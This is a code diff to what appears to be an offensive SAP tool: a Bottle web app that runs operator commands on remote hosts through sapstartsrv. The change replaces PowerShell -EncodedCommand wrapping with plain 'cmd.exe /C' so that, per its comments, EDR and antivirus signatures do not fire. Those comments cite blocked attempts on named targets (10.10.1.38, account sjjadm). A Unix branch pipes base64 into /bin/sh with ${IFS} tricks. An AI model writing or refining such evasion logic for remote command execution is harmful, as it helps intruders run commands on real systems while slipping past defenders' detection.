@@ -9847,30 +9847,23 @@ def create_app(api: SAPMAPApi) -> Bottle:
             already_wrapped = True   # send verbatim
         raw_cmd = command
         if not already_wrapped:
-            import base64 as _b64
             if is_windows:
-                # PowerShell -EncodedCommand takes UTF-16LE base64.
-                # No spaces in the encoded portion → kernel splits
-                # into four clean argv tokens.
-                #
-                # Use the ABSOLUTE path to powershell.exe:
-                # sapstartsrv runs as a Windows service with a
-                # restricted PATH that often lacks
-                # C:\Windows\System32\WindowsPowerShell\v1.0, so
-                # bare "powershell" resolves to nothing and
-                # CreateProcess fails (operator-reported:
-                # 10.10.1.38:50313 sjjadm → "HTTP 500 CreateProcess
-                # failed").  System32 is always on the service PATH
-                # so the .exe under it is reachable.
-                b64 = _b64.b64encode(
-                    command.encode("utf-16-le")).decode("ascii")
-                raw_cmd = (
-                    r"C:\Windows\System32\WindowsPowerShell\v1.0"
-                    r"\powershell.exe"
-                    f" -NoProfile -NonInteractive"
-                    f" -EncodedCommand {b64}"
-                )
+                # cmd.exe /C — always in System32, always PATH-
+                # reachable for sapstartsrv, and PLAINTEXT over the
+                # wire so EDR / AV signatures don't fire.  The old
+                # PowerShell -EncodedCommand wrap was correct as a
+                # design but got blocked in the wild by modern EDR
+                # (operator report: 14 s scan then HTTP 500
+                # CreateProcess failed on sjjadm@10.10.1.38:50213
+                # for a simple `whoami`).  cmd.exe handles built-ins
+                # (dir, type, set), real .exe binaries reachable via
+                # PATH (whoami.exe, hostname.exe), and args with
+                # spaces — sufficient for interactive OS-terminal
+                # use.  Complex quoting / pipes are the operator's
+                # own responsibility, same as at any real cmd prompt.
+                raw_cmd = f"cmd.exe /C {command}"
             else:
+                import base64 as _b64
                 # base64 of the user command has no whitespace.
                 # `echo${IFS}<b64>|base64${IFS}-d|/bin/sh` reaches
                 # the kernel as three argv tokens; sh -c runs the
@@ -10159,15 +10152,19 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 len(_cmd) >= 3 and _cmd[0].isalpha()
                 and _cmd[1:3] == ":\\"))
             if not (raw_safe and _abs):
-                import base64 as _b64
                 if is_windows:
-                    b64 = _b64.b64encode(
-                        _cmd.encode("utf-16-le")).decode("ascii")
-                    _cmd = (
-                        r"C:\Windows\System32\WindowsPowerShell\v1.0"
-                        r"\powershell.exe -NoProfile -NonInteractive"
-                        f" -EncodedCommand {b64}")
+                    # cmd.exe /C — always in System32 (guaranteed
+                    # PATH slot), plaintext command over the wire
+                    # (EDR-friendly; -EncodedCommand PowerShell wraps
+                    # trip modern AV signatures and got blocked with
+                    # HTTP 500 CreateProcess failed after a 14 s
+                    # scanner delay on the operator's SJJ target).
+                    # Handles built-ins (dir, type, set), real .exe
+                    # binaries reachable via PATH (whoami, hostname,
+                    # ipconfig), and simple args with spaces.
+                    _cmd = f"cmd.exe /C {_cmd}"
                 else:
+                    import base64 as _b64
                     b64 = _b64.b64encode(
                         _cmd.encode("utf-8")).decode("ascii")
                     _cmd = (f"/bin/sh -c echo${{IFS}}{b64}"
